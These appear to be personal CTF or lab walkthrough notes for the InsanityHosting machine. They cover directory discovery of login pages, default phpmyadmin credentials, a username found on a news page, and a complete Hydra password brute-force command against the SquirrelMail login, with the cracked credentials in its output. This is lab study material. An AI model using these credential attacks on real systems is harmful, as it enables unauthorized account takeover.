autorecon 192.168.191.124

Directory busted alot and found 4 login pages. So dizzy
Found out default creds for phpmyadmin is `admin: ` or `administrator: ` or `root: `
```
http://192.168.191.124/monitoring/login.php
http://192.168.191.124/phpmyadmin
http://192.168.191.124/webmail/src/login.php
http://www.insanityhosting.vm/news/admin/
```

Found user otis in `http://192.168.191.124/news/`
```
Monitoring Service

Our team have been working hard to create you a free monitoring service for your servers. A special thank you to Otis, who led the team.

We are pleased to announce that from next week, you will be able to register for our monitoring service. This will remain free, whether you are a customer or not.
```

Hydra on the squirrelmail
```
hydra -l otis -P /usr/share/wordlists/rockyou.txt 192.168.191.124 http-post-form "/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."                       
[80][http-post-form] host: 192.168.191.124   login: otis   password: 123456
1 of 1 target successfully completed, 1 valid password found
```


 